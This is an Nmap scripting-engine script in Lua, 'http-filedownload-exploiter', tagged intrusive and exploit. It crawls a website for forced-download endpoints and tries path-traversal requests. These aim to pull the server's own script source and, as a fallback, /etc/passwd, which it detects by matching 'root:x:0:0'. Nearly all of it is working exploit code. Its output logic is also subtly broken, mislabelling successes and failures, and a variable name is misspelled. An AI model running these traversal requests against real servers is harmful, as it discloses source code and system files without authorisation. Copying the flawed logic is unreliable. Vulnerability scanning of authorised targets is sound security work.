local http = require "http"
local httpspider = require "httpspider"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"
local url = require "url"

description = [[
Gets a website and tries to identify files that force downloads and do 
not check for valid extensions, enabling 'malicious' downloads (e.g. 
configuration files). 
]]

---
-- @usage
-- nmap --script http-filedownload-exploiter <target> -p80
--
-- This script discovers forced downloads by checking for the 
-- 'Content-Disposition' field in the header section, and then attempts 
-- to do 'malicious' download requests: tries some basic combinations to
-- download itself, and if that doesn't work tries to download a 
-- wildcard (Linux only)
--
-- TODO:
--     - Discuss better patterns to identify possible targets. Should we
--       check all urls? use crawler:isresource? 
--     - More wildcards.
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-filedownload-exploiter: 
-- |   
-- |   Possible file download: http://localhost/foo.php?name=bar.pdf
-- |   Content-Disposition: attachment; filename=arch.pdf
-- |   Trying self download: http://localhost/foo.php?name=foo.php (SUCCESS)
-- |   Trying self download: http://localhost/foo.php?name=./foo.php (SUCCESS)
-- |   Trying self download: http://localhost/foo.php?name=../foo.php (FAIL)
-- |
-- |   Possible file download: http://localhost/some/path/foo.php?name=bar.pdf
-- |   Content-Disposition: attachment; filename=arch.pdf
-- |   Trying self download: http://localhost/some/path/foo.php?name=foo.php (FAIL)
-- |   Trying self download: http://localhost/some/path/foo.php?name=./foo.php (FAIL)
-- |   Trying self download: http://localhost/some/path/foo.php?name=../foo.php (FAIL)
-- |   Trying wildcard: http://localhost/foo.php?name=../../../../../../../../../../etc/passwd (SUCCESS)
-- |_  
--
--
-- @args http-filedownload-exploiter.breakonsuccess stops spidering at the
--       first successfully self download. (default: false)
-- @args http-filedownload-exploiter.maxdepth the maximum amount of directories beneath
--       the initial url to spider. A negative value disables the limit
--       (default: 3)
-- @args http-filedownload-exploiter.maxpagecount the maximum amount of pages to visit.
--       A negative value disables the limit (default: 20)
-- @args http-filedownload-exploiter.url the url to start spidering. This is a URL
--       relative to the scanned host eg. /default.html (default: /)
-- @args http-filedownload-exploiter.withinhost only spider URLs within the same host.
--       (default: true)
-- @args http-filedownload-exploiter.withindomain only spider URLs within the same
--       domain. This widens the scope from <code>withinhost</code> and can
--       not be used in combination. (default: false)        
--

author = "Israel Leiva"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "exploit", "vuln"}


portrule = shortport.http

--
-- Tries to obtain the URL to download a file and the name of the file 
-- that forces the download
-- 
-- @param  str_url url to download a file
-- @param  content_disp content of 'Content-Disposition' (header) field
-- @return the URL to download a file and the name of file that forces
-- the download (e.g. /dir/down.php?f=, down.php)
--
local function get_file_path(str_url, content_disp)
  local file = content_disp:match(".*filename=\"*(.*%.%w+)\"*")
  local url_to_down, url_to_file, file_forces
    if file then
      url_to_down = str_url:match("(.*%=).*" .. file .. ".*")
      if url_to_down then
        url_to_file = url_to_down:match("(.*)%?.*")
        if url_to_file then
          file_forces = url_to_file:match(".*/(%w+%.%w+)")
        end
      end
    end
  return file_forces, url_to_down
end

--
-- Download a given file and check for pattern in content
-- 
-- @param  target the download URL
-- @param  pattern describes what to look into the file to check if
--         it has downloaded itself
-- @return true if it finds the pattern, false otherwise
--
local function self_download(host, port, target, pattern)
  local res    = http.get(host, port, target) 
  if res.status == 200 then
    local m = res.body:match(pattern)
    if m then
      return true
    else
      return false
    end
  else
    return false
  end
end
   

action = function(host, port)

  local break_on_success = stdnse.get_script_args("http-filedownload-exploiter.breakonsuccess")
  local crawler = httpspider.Crawler:new( host, port, nil, { scriptname = SCRIPT_NAME, useheadfornonwebfiles=true } )
  local results, patterns, comb, wilcard = {}, {}, {}, ""
  local self_pattern, wildcard_pattern = "[Cc]ontent%-[Dd]isposition%:%s*([Aa]ttachment)", "root:x:0:0:.*"
  
  --
  -- A list of possible download URLs. Quite basic
  --
  table.insert(patterns, ".*%.php%?.*%.pdf.*")
  table.insert(patterns, ".*%.pl%?.*%.pdf.*")
  table.insert(patterns, ".*%.cgi%?.*%.pdf.*")
  table.insert(patterns, ".*%.asp%?.*%.pdf.*")
  table.insert(patterns, ".*%.php%?.*%.doc.*")
  table.insert(patterns, ".*%.pl%?.*%.doc.*")
  table.insert(patterns, ".*%.cgi%?.*%.doc.*")
  table.insert(patterns, ".*%.asp%?.*%.doc.*")
  
  --
  -- A list of routes to check for self download
  --
  table.insert(comb, "")
  table.insert(comb, "./")
  table.insert(comb, "../")
  table.insert(comb, "../../")
  table.insert(comb, "../../../")
  table.insert(comb, "../../../../../")
  
  --
  -- Wildcard for misconfigured servers 
  --
  wildcard = "../../../../../../../../../../etc/passwd"
  
  if ( not(crawler) ) then
    return
  end
 
  while(true) do
    local status, res = crawler:crawl()

    if ( not(status) ) then
      if ( res.err ) then
        return stdnse.format_output(true, ("ERROR: %s"):format(res.reason))
      else
        break
      end
    end
    
    local str_url, success, vuln = tostring(res.url), false, 0

    --
    -- Iterate over a list of possible file download urls
    --
    for _, p in pairs(patterns) do
      if res.response and str_url:match(p) then
        local msg = "\n" .. "Possible file download: " .. str_url
        local file, path, target
        local content_disp = res.response.header["content-disposition"]
		  
        --
        -- In case the download has been forced
        --
        if content_disp then
          msg = msg .. "\nContent-Disposition: " .. content_disp
          file, path = get_file_path(str_url, content_disp)
          if path and file then
            for _, c in pairs(comb) do
              target = path .. c .. file
              msg = msg .. "\nTrying self download: " .. target
              if self_download(host, port, target, self_pattern) then
                -- Great, we just downloaded ourselves!
                msg = msg .. " (SUCCESS)"
                vuln = vuln + 1
                if break_on_success then
                  crawler:stop()
                  break
                else
                  msg = msg .. " (FAIL)"
                end
              end
            end
				
            --
            -- We couldn't download ourselves, but the file may still
            -- be vulnerable. Tries with a common wildcard in misconfigured
            -- servers.
            --
            if vuln == 0 then
              target = path .. wildcard
              msg = msg .. "\nTrying wildcard: " .. target
              if self_download(host, port, target, wildcard_pattern) then
                msg = msg .. " (SUCCESS)"
                vuln = vuln + 1
              else
                msg = msg .. " (FAIL)"
              end
            end
          else
            msg = msg .. " (FAIL)"
          end
        end
        msg = msg .. "\n\n"
        table.insert(results, msg)
      end
		
      if break_on_success and vuln > 0 then
        break
      end
    end
  end
  results.name = crawler:getLimitations()
  return stdnse.format_output(true, results)
end
